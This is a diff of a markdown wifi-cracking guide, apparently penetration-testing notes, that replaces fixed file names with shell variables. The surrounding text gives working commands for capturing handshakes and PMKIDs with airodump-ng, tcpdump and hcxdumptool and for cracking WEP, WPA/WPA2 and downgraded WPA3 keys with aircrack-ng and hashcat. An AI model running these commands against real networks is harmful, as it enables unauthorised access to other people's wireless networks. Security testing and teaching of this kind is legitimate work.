@@ -41,7 +41,7 @@ sudo airodump-ng "${interface}"
 or
 
 ```bash
-sudo airodump-ng "${interface}" --essid "MyNetworkName"
+sudo airodump-ng "${interface}" --essid "$network_name"
 ```
 
 This will display a list of all the wifi networks in range, and note the BSSID
@@ -60,7 +60,7 @@ To crack WEP, you need to capture packets from the target network. You can do
 this using the following command:
 
 ```bash
-sudo airodump-ng --channel "$channel" --bssid "$bssid" --write outputdump "$interface"
+sudo airodump-ng --channel "$channel" --bssid "$bssid" --write "$dump_file" "$interface"
 ```
 
 You want a lot of Data packets (not just Beacons).
@@ -121,7 +121,7 @@ Once you have captured the handshake, you can crack the WPA/WPA2 key using a
 wordlist. You can use the following command to crack the key:
 
 ```bash
-aircrack-ng -w wordlist.txt capture.pcap
+aircrack-ng -w "$wordlist" "$pcap_file"
 ```
 
 This will attempt to crack the WPA/WPA2 key using the wordlist provided. If
@@ -140,7 +140,7 @@ we could only use the handshake with it, and this method allows us to use
 First, we need to do a dump using `tcpdump` :
 
 ```bash
-sudo tcpdump -s 65535 -y IEEE802_11_RADIO "wlan addr3 $bssid or wlan addr3 ffffffffffff" -ddd > output.bpf
+sudo tcpdump -s 65535 -y IEEE802_11_RADIO "wlan addr3 $bssid or wlan addr3 ffffffffffff" -ddd > "$bpf_file"
 ```
 
 Then, we can use `hcxdumptool` to capture the handshake or the PMKID, and it is
@@ -154,7 +154,7 @@ Thus, you can use the following command:
 
 ```bash
 band="a" # or b,c
-sudo hcxdumptool -i "$interface" -c "$channel$band" --bpf=output.bpf -w output.pcapng
+sudo hcxdumptool -i "$interface" -c "$channel$band" --bpf="$bpf_file" -w "$pcapng_file"
 ```
 
 This will create a pcapng file with the captured packets, you need to wait for
@@ -176,7 +176,7 @@ Now, we need to convert the pcapng file to the specific hash that `hashcat` can
 use. To do this, we can use the following command:
 
 ```bash
-hcxpcapngtool -o output.hc22000 output.pcapng
+hcxpcapngtool -o "$hc22000_file" "$pcapng_file"
 ```
 
 Finally, we can use [`hashcat`](https://n4c.hadi.diy/cracking/hash.html#hashcat)
@@ -185,7 +185,7 @@ the following command to try to crack the hash using a wordlist and a rule file,
 but bruteforce is also possible for wireless cracking.
 
 ```bash
-hashcat -m 22000 -a 0 -o output -r /tmp/OneRuleToRuleThemStill/OneRuleToRuleThemStill.rule output.hc22000 /tmp/wordlists/passwords/most_used_passwords.txt -w 4 --opencl-device-types 1,2
+hashcat -m 22000 -a 0 -o "$output_file" -r /tmp/OneRuleToRuleThemStill/OneRuleToRuleThemStill.rule "$hc22000_file" /tmp/wordlists/passwords/most_used_passwords.txt -w 4 --opencl-device-types 1,2
 ```
 
 ## WPA3 downgrade
@@ -237,7 +237,7 @@ Once you have captured the handshake, you can crack the WPA3 key using a
 wordlist. You can use the following command to crack the key:
 
 ```bash
-aircrack-ng -w "$wordlist" output.pcap
+aircrack-ng -w "$wordlist" "$pcap_file"
 ```
 
 This will attempt to crack the WPA3 key using the wordlist provided. If
